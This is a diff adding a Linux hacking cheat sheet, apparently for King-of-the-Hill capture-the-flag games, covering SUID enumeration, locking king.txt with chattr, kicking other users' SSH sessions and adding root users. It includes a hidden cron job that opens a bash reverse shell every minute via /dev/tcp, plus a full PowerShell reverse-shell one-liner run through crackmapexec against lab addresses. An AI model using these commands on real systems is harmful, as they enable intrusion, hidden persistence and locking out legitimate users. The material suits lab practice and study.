@@ -3,6 +3,26 @@ Hacking linux
 
 
 
+- [one tricks/others](#one-tricksothers)
+  - [looking for root permissions](#looking-for-root-permissions)
+  - [using chattr](#using-chattr)
+  - [fixing the vulnerability in /etc/sudoers, for example](#fixing-the-vulnerability-in-etcsudoers-for-example)
+  - [finding flags](#finding-flags)
+  - [full tty shell](#full-tty-shell)
+  - [protecting your king using while](#protecting-your-king-using-while)
+  - [how to see who is logged into the system](#how-to-see-who-is-logged-into-the-system)
+  - [killing session of a user logged into ssh/system](#killing-session-of-a-user-logged-into-sshsystem)
+  - [changing ssh user password](#changing-ssh-user-password)
+  - [defending box](#defending-box)
+  - [python http server](#python-http-server)
+  - [python smb server](#python-smb-server)
+  - [adding users with root privileges](#adding-users-with-root-privileges)
+  - [Remove user from sudoers](#Remove-user-from-sudoers)
+  - [using crontab to load a script with a reverse shell every 1 minute](#using-crontab-to-load-a-script-with-a-reverse-shell-every-1-minute)
+  - [one liner bangers](#one-liner-bangers)
+  - [check running services](#check-running-services)
+  - [upgrade normal shell in metasploit to a meterpreter shell](#upgrade-normal-shell-in-metasploit-to-a-meterpreter-shell)
+---------------------------------------------------------------------------------------------------------------------------------------------------------
 - [basic local machine enumeration](#basic-local-machine-enumeration)
   - [System](#System)
   - [Users](#Users)
@@ -11,10 +31,256 @@ Hacking linux
   - [DNS](#DNS)
   - [SMB](#SMB)
   - [SNMP](#SNMP)
+---------------------------------------------------------------------------------------------------------------------------------------------------------
   
   
-  
-  
+  # one tricks/others
+
+### looking for root permissions
+
+* you can use find to search for permissions with root
+
+```
+find / -type f \( -perm -4000 -o -perm -2000 \) -print
+```
+* Find SUID privescs using the following commands:
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+
+* Find SGID privescs using the following commands:
+```
+find / -perm -g=s -type f 2>/dev/null
+```
+
+
+
+### using chattr
+
+* you can use this to make the file immutable and therefore keep your name in this file.
+* if the box dont have chattr you can simply install chattr or download chattr binary or busybox binary 
+
+Add the immutability bit:
+```
+chattr +i /root/king.txt
+```
+
+Remove the immutability bit:
+```
+chattr -i /root/king.txt
+```
+
+Remove chattr:
+```
+which chattr # Get chattr's path, default: /usr/bin/chattr
+```
+
+```
+rm usr/bin/chattr # Or another path if different
+```
+
+
+
+### fixing the vulnerability in /etc/sudoers, for example
+
+```
+# User privilege specification
+root ALL=(ALL=ALL) ALL
+teste ALL=(root) SETENV:NOPASSWD: /usr/bin/git *, /usr/bin/chattr
+test1 ALL=(root) NOPASSWD: /bin/su test1, /usr/bin/chattr
+```
+
+* here you can see that user teste and teste1 has root permission on the git and su binary, to fix this just remove everything from the teste and teste1 there
+
+```
+root ALL=(ALL=ALL) ALL
+```
+
+* and it will be like that, so there will be no way to climb privilege by su and git
+
+### finding flags
+
+## using find
+
+* you can use find to look for flags
+
+```
+find / -name flag.txt 2>/dev/null
+find / -name user.txt 2>/dev/null
+find / -name .flag 2>/dev/null
+find / -name flag 2>/dev/null
+find / -name root.txt 2>/dev/null
+```
+
+## using grep
+
+ops this one is for when the directory you are in at the momoent
+```
+grep -ri thm{ 2>/dev/null
+```
+
+### full tty shell
+
+* tweaking your shell, if you get a reverse shell and you ctrl + c and your shell closes/stops, this will help you and you can edit, give ctrl + c at will
+
+```
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+export TERM=xterm
+Ctrl + z
+stty raw -echo;fg
+```
+* for you to know which pts (pseudo slave terminal) the user is connected, just use the following command in the terminal: w , then just see which pts the user is and use the command
+
+* extra: this works sometimes too 
+
+```
+/usr/bin/script -qc /bin/bash /dev/null
+export TERM=xterm
+Ctrl + z
+stty raw -echo;fg
+```
+
+## protecting your king using while
+this one is using chattr too to protect the file 
+```
+while true; do echo "suljov" > /root/king.txt; chattr +ia king.txt; set -O noclobber king.txt; done &
+```
+
+
+## how to see who is logged into the system
+
+* you can use the following commands to see who is logged into ssh/system
+
+```
+w
+who
+ps aux | grep pts
+```
+
+## killing session of a user logged into ssh/system
+
+* to kill someone's session just use the following command
+manual:
+```
+pkill -9 -t pts/1
+```
+## kicking all users connected in ssh
+```
+kill `ps aux|grep pts| awk '{print $2}'`;
+```
+
+## kicking all people connected to a given user on ssh 
+```
+pkill -9 -U <name> 
+```
+
+
+* as explained in some examples above, just put the pts of the user you want to remove from the machine
+
+### changing ssh user password
+
+* to change a user's password just use the following command
+
+```
+passwd [UserName]
+```
+
+* you can change ssh keys
+
+
+
+### defending box
+
+* Look for common ways to fix a box, for example: changing ssh keys, changing passwords, look for running processes or even in cronjobs
+
+* Always set your persistence so that even if someone kicks you out, you have multiple ways to get back.
+
+* So start fixing things in the box. Fix security issues, not legitimate services. For example, disabling ssh is NOT allowed unless it is an intentionally broken ssh installation.
+
+## python http server
+
+```
+python3 -m http.server <port>
+```
+
+## python smb server
+```
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+```
+
+## adding users with root privileges
+
+first
+```
+adduser <name> 
+```
+then edit the /etc/sudoers with this 
+```
+<user> ALL=(ALL:ALL) ALL
+```
+
+
+
+ 
+## Remove user from sudoers
+```
+nano /etc/sudoers
+```
+
+or alternative
+```
+visudo
+```
+
+## using crontab to load a script with a reverse shell every 1 minute
+first
+```
+echo "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" > .persistence.sh
+```
+then
+```
+chmod +x .persistence.sh
+```
+after that you go in to vim
+```
+vim /etc/crontab
+```
+and add this 
+```
+* * * * * root /dev/shm/.persistence.sh
+```
+save and quit then you can connect with a reverse shell every 1 minute with nc like 
+```
+nc -lvnp <PORT> 
+```
+
+## one liner bangers
+
+
+```
+sudo crackmapexec smb --exec-method atexec -d INLANEFREIGHT.LOCAL -u xxxxx-p xxxxx -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""172.16.5.225""""; $port=""""4444"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};' 172.16.5.5
+```
+## check running services
+```
+netstat 
+```
+```
+netstat -tulwn
+```
+
+### upgrade normal shell in metasploit to a meterpreter shell
+
+if you can get a shell but for some reason cant get the meterpreter shell to work do this.
+
+get a shell with just a generic shell on metasploit when use this: 
+```
+use multi/manage/shell_to_meterpreter
+```
+
+then update the opstions and then write:
+```
+run
+```
   
   
   
